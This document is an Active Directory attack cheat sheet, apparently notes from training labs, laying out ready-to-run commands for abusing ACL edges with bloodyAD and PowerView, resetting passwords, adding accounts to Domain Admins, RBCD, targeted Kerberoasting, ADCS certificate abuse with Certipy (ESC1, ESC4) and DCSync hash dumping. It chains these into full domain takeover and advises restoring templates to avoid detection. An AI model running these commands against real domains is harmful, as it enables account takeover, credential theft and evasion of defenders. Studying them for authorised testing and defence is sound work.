## ACL Abuse with bloodyAD

BloodHound surfaces the *attack edges* — `GenericAll`, `WriteOwner`, `WriteDACL`, `ForceChangePassword`, `AddSelf`, `WriteSPN`. `bloodyAD` is the Linux tool to actually exploit those edges.

---

### Install

```bash
pipx install bloodyAD
## or
git clone https://github.com/CravateRouge/bloodyAD && cd bloodyAD
pip install -r requirements.txt --break-system-packages
```

### Read an Object

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> get object <target>
```

### Set an Attribute

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    set object -v '<value>' <target> <attr>
```

Examples worth knowing:

```bash
## Add a UPN suffix
bloodyAD ... set object -v 'admin@<dom>.local' jdoe userPrincipalName

## Set a fake SPN so the account becomes Kerberoastable
bloodyAD ... set object -v 'fake/spn' victim servicePrincipalName

## Disable account lockout / pwdLastSet manipulation
bloodyAD ... set object -v '0' victim pwdLastSet
```

### Add Group Membership (when you have rights on a group)

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    add groupMember 'Domain Admins' <user-to-add>
```

### Show Writeable Objects (which ACL edges grant you something)

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> get writable
```

### Common Abuses by Edge

| BloodHound edge | What `bloodyAD` lets you do |
|-----------------|------------------------------|
| **GenericAll** | Anything — reset password, change SPN, add to group, write `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD). |
| **GenericWrite** | Change attributes — set SPN to make user Kerberoastable, set logon script. |
| **WriteOwner** | `set owner <yourself> <target>` → then grant yourself the rights you actually want. |
| **WriteDACL** | Modify the ACL directly → grant `GenericAll`. |
| **ForceChangePassword** | Reset the target's password without knowing the current one. |
| **AddMember** | Add yourself to a group (`Domain Admins`, `Account Operators`, etc.). |
| **AddSelf** | Add yourself to a specific group (same effect as AddMember on yourself). |

#### Examples

##### ForceChangePassword

```bash
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    set password '<victim>' 'NewP@ss123!'
```

##### WriteOwner Chain (own → grant → exploit)

`WriteOwner` alone doesn't let you do anything. The pattern is: seize ownership → grant yourself `GenericAll` → then use whatever privileged path the target object opens up (RBCD, Kerberoast, cert request, DCSync).

```bash
## 1. Take ownership of the target
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> set owner <target> <user>

## 2. Grant yourself GenericAll on the now-owned object
bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> add genericAll <target> <user>

## 3. Whatever the target lets you do
##    - If <target> is a user with ADCS enrollment rights → certipy shadow to steal its NT hash:
certipy-ad shadow auto -u <user>@<dom>.local -p '<pass>' -account <target> -dc-ip <dc-ip>
##    - If <target> is a computer object → RBCD (see below)
##    - If <target> is a group → add yourself to it
```

##### WriteDACL → Self DCSync (one-shot)

If you have `WriteDACL` on the *domain object* itself, you can grant yourself the two extended rights that make up DCSync (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) with one bloodyAD call, then dump the domain.

```bash
bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
    add dcsync <user>

impacket-secretsdump -just-dc <dom>/<user>:'<pass>'@<dc-ip>
```

##### GenericAll on a Group — Add Yourself, Inherit Everything

`GenericAll` on a group means you can `add groupMember` — which means every ACL edge the group holds becomes an edge *you* hold. This is how you chain nested group rights: pop a low-priv user with `GenericAll` on some helpdesk group, add yourself, and now you have whatever the helpdesk group had over the next tier.

```bash
bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
    add groupMember '<target-group>' <user>

## Then re-run BloodHound / `get writable` from your account to see the new edges
bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' get writable
```

##### Setting a Fake SPN (Targeted Kerberoasting)

```bash
bloodyAD ... set object -v 'http/x' <victim> servicePrincipalName
impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <dc-ip> -request -outputfile spn.txt
hashcat -m 13100 spn.txt rockyou.txt
```

##### Writing msDs-AllowedToActOnBehalfOfOtherIdentity (RBCD)

```bash
impacket-addcomputer -computer-name 'PWN$' -computer-pass 'P@ss123' \
    -dc-ip <dc-ip> <dom>/<user>:<pass>

bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
    add rbcd <victim-host> 'PWN$'

impacket-getST -spn cifs/<victim-fqdn> -impersonate Administrator <dom>/'PWN$':'P@ss123'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <dom>/Administrator@<victim-fqdn>
```

### ADCS Abuse (Certipy)

If Active Directory Certificate Services is deployed, there's almost always an insta-DA path — enrolling a certificate as a privileged user, then authenticating with the cert to pull that user's NT hash.

**Naming tell:** any account called `ca_svc`, `cert_svc`, `pki_svc`, `enrollment_svc` — that's the CA's operator account and usually holds enroll rights on every template.

#### Find vulnerable templates

```bash
certipy-ad find -u <user>@<dom>.local -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout

## Or with an NT hash
certipy-ad find -u <user>@<dom>.local -hashes <NTLM> -dc-ip <dc-ip> -vulnerable -stdout
```

#### ESC categories (short)

| ESC | What's wrong | Fix path |
|-----|--------------|----------|
| **ESC1** | Template lets requester supply SAN + is set for client auth | Request a cert `-upn Administrator@<dom>` and auth as them |
| **ESC2** | Template usable as any-purpose (or Enrollment Agent) | Request a cert that authenticates as any user |
| **ESC3** | Enrollment Agent template + a client-auth template exists | Enrollment Agent → on-behalf-of DA |
| **ESC4** | You hold write rights over a template | Rewrite it to be ESC1-vulnerable, exploit, restore |
| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set | Any template → supply SAN → ESC1 |
| **ESC7** | You have `ManageCA` / `ManageCertificates` on the CA itself | Approve your own pending cert / enable the ESC6 flag |
| **ESC8** | HTTP endpoint of CA + NTLM enabled | NTLM relay coerced auth → get cert |
| **ESC9/10** | UPN or `msDS-KeyCredentialLink` weirdness | Cert-based hash steal |
| **ESC16** | Certifried variant on machine account attribute writes | Impersonate a computer, request cert |

#### ESC1 (request cert as Administrator directly)

```bash
certipy-ad req -u <user>@<dom>.local -p '<pass>' \
    -ca '<CA-name>' -template '<vuln-template>' \
    -upn Administrator@<dom>.local -dc-ip <dc-ip>

## Auth with the cert → hash
certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
```

#### ESC4 (rewrite → exploit → restore)

```bash
## Rewrite the target template into an ESC1-vulnerable state
certipy-ad template -u <user>@<dom>.local -hashes <NTLM> \
    -template '<template>' -dc-ip <dc-ip> -write-default-configuration

## Now exploit as ESC1
certipy-ad req -u <user>@<dom>.local -hashes <NTLM> \
    -ca '<CA-name>' -template '<template>' \
    -upn Administrator@<dom>.local -dc-ip <dc-ip>

certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>

## When done, restore the template's original config to avoid detection
certipy-ad template -u <user>@<dom>.local -hashes <NTLM> \
    -template '<template>' -dc-ip <dc-ip> -write-configuration <saved-config>
```

#### Chain: WriteOwner on ca_svc → ADCS DA

The full path when you land in the middle of a domain (as in EscapeTwo):

```
low-priv user
  → WriteOwner on ca_svc
  → set owner + genericAll on ca_svc         (bloodyAD)
  → certipy-ad shadow auto → ca_svc NT hash  (steals a shadow credential)
  → certipy-ad find -vulnerable              (as ca_svc — sees every template)
  → certipy-ad template ... -write-default-configuration  (ESC4 rewrite)
  → certipy-ad req -upn Administrator        (ESC1 exploit)
  → certipy-ad auth -pfx administrator.pfx   → Administrator NT hash
  → impacket-psexec -hashes :<NTLM> administrator@dc
```

### Mapping BloodHound Edges to Tooling

| Edge | Abuse path |
|------|------------|
| `ForceChangePassword` | `Set-DomainUserPassword` (PowerView) or bloodyAD `set password` |
| `Add Members` | `Add-DomainGroupMember` (PowerView) or bloodyAD `add groupMember` |
| `GenericAll` | Set password / add to group / set SPN for Kerberoasting / set RBCD attribute |
| `GenericWrite` | Set fake SPN → Kerberoast |
| `WriteOwner` | `Set-DomainObjectOwner` |
| `WriteDACL` | `Add-DomainObjectACL` |
| `AllExtendedRights` | `Set-DomainUserPassword` or `Add-DomainGroupMember` |
| `AddSelf` | `Add-DomainGroupMember` |

### PowerView ACL Workflow (from a domain-joined Windows host)

#### Auth as your Tier-0 user (if you don't already have a session as them)

```bash
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

#### Find what you can write

```bash
## Resolve a name to a SID
$sid = Convert-NameToSid wley

## ACLs where this principal has any modify rights
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Slower but sometimes clearer — diff every user's ACL against your principal:

```bash
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access |
        Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
}
```

Chain forward — after compromising one ACL edge, check the *next* identity's edges:

```bash
$sid2 = Convert-NameToSid damundsen
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
```

> BloodHound is faster for chaining — click your starting principal, **Outbound Control Rights**, follow the path.

### ACL Abuse — PowerView Examples

#### Force-change a downstream user's password

```bash
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword `
    -Credential $Cred -Verbose
```

#### Add a user to a group you control

```bash
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

## Confirm
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

#### Set a fake SPN → make a user Kerberoastable

```bash
Set-DomainObject -Credential $Cred2 -Identity adunn `
    -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

## Then crack the new ticket
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

#### GenericWrite → Add yourself to Domain Admins (cmd-prompt method)

```bash
net group 'Domain Admins' ct059 /add /domain
```

Then drop into a session as your new admin:

```bash
$cred = New-Object System.Management.Automation.PSCredential(
    "INLANEFREIGHT\CT059",
    (ConvertTo-SecureString "charlie1" -AsPlainText -Force))
Enter-PSSession -ComputerName DC01 -Credential $cred
```

#### DCSync once you have the right ACE

```bash
impacket-secretsdump -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

### Reference

- Harmj0y's classic AD ACL cheatsheet: <https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993>
- bloodyAD docs: <https://github.com/CravateRouge/bloodyAD/wiki>
